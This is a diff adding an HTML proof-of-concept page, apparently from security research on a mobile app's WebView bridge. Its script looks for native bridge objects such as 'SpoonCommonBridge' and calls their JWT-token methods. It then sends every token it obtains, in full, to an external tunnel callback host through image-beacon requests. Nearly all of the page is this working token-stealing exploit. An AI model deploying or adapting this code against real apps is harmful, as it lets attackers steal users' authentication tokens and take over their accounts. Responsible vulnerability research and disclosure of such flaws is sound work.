@@ -1,0 +1,21 @@
+<html><head><title>POC</title></head>
+<body style="background:#fff;color:#000;font-size:28px;padding:20px;font-family:monospace;">
+<h1>PoC</h1>
+<div id="s" style="font-size:32px;font-weight:bold;">...</div>
+<pre id="r" style="font-size:20px;white-space:pre-wrap;word-break:break-all;"></pre>
+<script>
+var CB="https://aa6cec290f9d62a3-1-229-247-42.serveousercontent.com";
+var s=document.getElementById("s"),r=document.getElementById("r"),log=[];
+function L(t){log.push(t);r.textContent=log.join("\n");}
+function ping(l,d){new Image().src=CB+"/x/"+l+"?d="+encodeURIComponent(String(d));}
+L("start");ping("alive","1");
+var bs=["SpoonCommonBridge","SpoonWebBridge","NativeBridge"];
+for(var i=0;i<bs.length;i++){try{var o=window[bs[i]];
+if(o){L("BRIDGE:"+bs[i]);ping("br",bs[i]);
+["requestJwtToken","getJwtToken","getJwt"].forEach(function(m){
+try{if(typeof o[m]==="function"){var t=o[m]();
+if(t){L(bs[i]+"."+m+"="+String(t).substring(0,100));s.textContent="JWT:"+String(t).substring(0,40)+"...";s.style.color="green";ping("jwt_"+bs[i]+"_"+m,String(t));}
+else{L(bs[i]+"."+m+"=null");ping("n_"+bs[i]+"_"+m,"0");}
+}}catch(e){L(bs[i]+"."+m+"ERR:"+e.message);}});}}catch(e){}}
+if(log.length===1){L("NO BRIDGE");s.textContent="NO BRIDGE";ping("nobridge","0");}
+</script></body></html>
